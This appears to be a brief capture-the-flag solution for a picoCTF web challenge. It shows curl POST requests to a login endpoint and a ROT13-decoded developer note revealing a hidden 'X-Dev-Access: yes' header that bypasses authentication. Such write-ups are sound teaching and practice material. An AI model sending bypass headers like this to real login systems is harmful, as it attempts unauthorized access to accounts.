<!-- curl -X POST http://[TARGET_IP]/login \
     -H "Content-Type: application/json" \
     -H "X-Dev-Access: yes" \
     -d '{"email": "admin@example.com", "password": "password"}' -->

curl -X POST http://amiable-citadel.picoctf.net:53970/login \
     -H "Content-Type: application/json" \
     -H "X-Dev-Access: yes" \
     -d '{"email": "ctf-player@picoctf.org", "password": "password"}'

# ROT13 (Casser)
Original: ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"

Decoded: NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"